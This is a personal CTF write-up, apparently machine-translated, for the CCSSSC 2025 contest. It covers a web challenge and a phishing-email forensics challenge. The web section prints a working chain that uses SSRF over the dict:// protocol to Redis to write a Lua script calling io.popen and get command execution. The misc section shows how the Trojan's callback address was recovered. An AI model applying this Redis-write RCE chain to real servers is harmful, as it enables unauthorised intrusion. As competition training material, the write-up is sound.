---
title: "CCSSSC2025"
date: 2025-01-05
draft: false
description: "CCSSC 2025"
summary: "CCSSC 2025 Personal WriteUP"
tags: ["writeup", "ctf"]
categories: ["writeup"]
---

{{< alert >}}
**WARNING！** This is a machine translated version of the [Chinese page](/posts/ccsssc2025/)
{{< /alert >}}

## WEB

### CachedVisitor

[Attachment](/posts/ccsssc2025/attachments/fishingemail_25da885af63965bf249067b64099c319attachment_20250102090654845.zip)

Some useful tests:

![Proof of Internet Access](/posts/ccsssc2025/img/CachedVisitor-1.png)

![Proof of Any File Reading](/posts/ccsssc2025/img/CachedVisitor-2.png)

![Proof of dict protocol availability](/posts/ccsssc2025/img/CachedVisitor-3.png)

Container is connected to the network and can read files. The dict protocol is available and redis can be accessed

Analyzed the source code

```main.lua ```Read the contents between ```##LUA_START##``` and ```##LUA_END##``` from ```visit.script``` and run it as a script

```dockerfile
COPY flag /flag
COPY readflag /readflag
RUN chmod 400 /flag
RUN chmod +xs /readflag
```

The flag has permissions set and cannot be read directly.

Try to use redis to write visit.script to perform RCE

Write lua and test in local docker to output flag

```lua
##LUA_START##ngx.say(io.popen('/readflag'):read('*all'))##LUA_END##
```

Use redis to write lua to visit.script directly

```
dict://127.0.0.1:6379/set:payload:"##LUA_START##ngx.say(io.popen('/readflag'):read('*all'))##LUA_END##"
dict://127.0.0.1:6379/config:set:dir:/scripts/
dict://127.0.0.1:6379/config:set:dbfilename:visit.script
dict://127.0.0.1:6379/bgsave
```

After writing, you can execute what we wrote by sending a request at will Script

> ```dart{dc2e4048-dca7-4fa3-9803-8ee9d785af2b}```

## Misc

### Fishing E-mail

> Bob received a phishing email. Please find the return address and port of the Trojan.If the backlink address and port are 123.213.123.123:1234, then the sensitive information is MD5 (123.213.123.123:1234), that is, d9bdd0390849615555d1f75fa854b14f, which is based on the result of Cyberchef.

[Attachment](/posts/ccsssc2025/attachments/CachedVisitor.zip)

```yaml
Content-Transfer-Encoding: base64
```

Found that the encoding format is Base64, we directly decode to view the content

```
Today is your 24th birthday, wish you Happy birthday to you

<div class="qmbox"><p style="font-family: -apple-system, BlinkMacSystemFont, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-size: 10.5pt; color: rgb(46, 48, 51);">Today is your 24th birthday, wish you Happy birthday to you</p><div xmail-signature=""><xm-signature></xm-signature><p></p></div></div>

Birthday gift.zip(BIN)
```

I used CyberChef to extract the zip file and found that there was a password

```
Date: Mon, 11 Nov 2024 12:54:24 +0800
```

Based on birthday, guess the password ```20001111```

Successfully decompressed to get exe

After running in the virtual machine, capture the packet to get the reverse connection address!

![Capture result](/posts/ccsssc2025/img/Fishing_E-mail.png)

> MD5(222.218.218.218:55555)
>
> df3101212c55ea8c417ad799cfc6b509
